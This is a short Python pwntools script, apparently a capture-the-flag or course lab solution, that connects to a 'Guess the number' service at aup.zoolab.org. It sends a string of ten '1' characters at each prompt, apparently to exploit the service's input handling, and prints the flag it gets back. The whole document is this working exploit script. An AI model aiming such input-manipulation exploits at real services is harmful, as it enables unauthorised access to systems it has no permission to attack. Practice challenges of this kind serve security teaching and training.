from pwn import *
host = 'aup.zoolab.org'
port = 38157
r = remote(host, port)

payload = '1' * 10

r.recvuntil('Guess the number:')
r.sendline(payload)

r.recvuntil('Do you want to try it again?')
r.sendline(payload)

r.recvuntil('Guess the number:')
r.sendline(payload)

print(r.recvuntil('}').decode())
